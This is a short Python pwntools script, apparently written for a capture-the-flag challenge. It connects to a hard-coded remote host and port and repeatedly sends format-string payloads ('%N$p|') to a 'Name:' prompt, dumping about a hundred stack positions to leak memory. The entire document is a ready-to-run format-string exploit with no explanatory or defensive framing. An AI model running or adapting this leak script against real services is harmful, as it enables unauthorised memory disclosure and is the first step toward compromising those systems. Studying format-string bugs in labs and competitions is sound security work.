#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def leak_dump():
    HOST = "52.59.124.14"
    PORT = 5030
    
    try:
        io = remote(HOST, PORT)
        io.recvuntil(b'Name:\n')
        
        # Generates payload: %1$p,%2$p,...%50$p
        payload = ""
        for i in range(1, 100):
            payload += f"%{i}$p,"
        
        # Max input size is 128 bytes. We need to split
        # Just do chunks of 10 at a time
        io.close()
        
        print("Dumping stack values...")
        for i in range(1, 100, 8):
            try:
                io = remote(HOST, PORT)
                io.recvuntil(b'Name:\n')
                payload = ""
                for j in range(i, i+8):
                    payload += f"%{j}$p|"
                
                io.sendline(payload.encode())
                io.recvuntil(b"market:\n")
                resp = io.recvline().decode().strip()
                parts = resp.split('|')
                for k, part in enumerate(parts):
                    idx = i + k
                    print(f"Pos {idx:02d}: {part}")
                io.close()
            except Exception as e:
                print(f"Error at {i}: {e}")
                
    except Exception as e:
        print(f"Connection failed: {e}")

if __name__ == "__main__":
    leak_dump()
